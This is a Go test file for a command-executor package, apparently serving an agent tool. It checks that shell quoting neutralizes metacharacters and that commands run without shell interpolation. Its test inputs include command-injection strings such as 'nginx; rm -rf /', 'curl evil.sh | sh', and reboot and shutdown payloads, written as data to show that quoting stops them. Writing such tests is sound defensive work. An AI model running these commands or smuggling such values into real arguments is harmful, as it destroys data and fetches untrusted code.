package executor

import (
	"context"
	"strings"
	"testing"
)

func TestShellQuoteNeutralizesMetacharacters(t *testing.T) {
	// Each input is something an agent might send as a "service name".
	// After quoting, the shell must see exactly one word and run nothing extra.
	cases := []string{
		"nginx; rm -rf /",
		"nginx && curl evil.sh | sh",
		"$(reboot)",
		"`reboot`",
		"nginx\nreboot",
		"a'b",
		"'; shutdown -h now; '",
		"$HOME",
		"*",
	}
	for _, in := range cases {
		q := ShellQuote(in)
		if !strings.HasPrefix(q, "'") || !strings.HasSuffix(q, "'") {
			t.Fatalf("ShellQuote(%q) = %q: not wrapped in single quotes", in, q)
		}
		// Verify empirically: echo the quoted word and confirm the shell
		// reproduces the input byte for byte with no side effects.
		res, err := Local{}.Run(context.Background(), []string{"sh", "-c", "printf %s " + q})
		if err != nil {
			t.Fatalf("run for %q: %v", in, err)
		}
		if res.Stdout != in {
			t.Errorf("shell round-trip of %q produced %q", in, res.Stdout)
		}
	}
}

func TestQuoteArgvKeepsWordBoundaries(t *testing.T) {
	argv := []string{"systemctl", "restart", "nginx; reboot"}
	got := QuoteArgv(argv)
	want := `'systemctl' 'restart' 'nginx; reboot'`
	if got != want {
		t.Errorf("QuoteArgv() = %q, want %q", got, want)
	}
}

func TestLocalRunCapturesExitCode(t *testing.T) {
	res, err := Local{}.Run(context.Background(), []string{"sh", "-c", "exit 3"})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if res.ExitCode != 3 {
		t.Errorf("ExitCode = %d, want 3", res.ExitCode)
	}
}

func TestLocalRunNoShellInterpolation(t *testing.T) {
	// argv[1] must reach echo literally: no command substitution happens
	// because no shell is involved.
	res, err := Local{}.Run(context.Background(), []string{"echo", "$(id -u)"})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if strings.TrimSpace(res.Stdout) != "$(id -u)" {
		t.Errorf("Stdout = %q, want the literal string", res.Stdout)
	}
}

func TestLocalRunRejectsEmptyArgv(t *testing.T) {
	if _, err := (Local{}).Run(context.Background(), nil); err == nil {
		t.Error("expected an error for empty argv")
	}
}
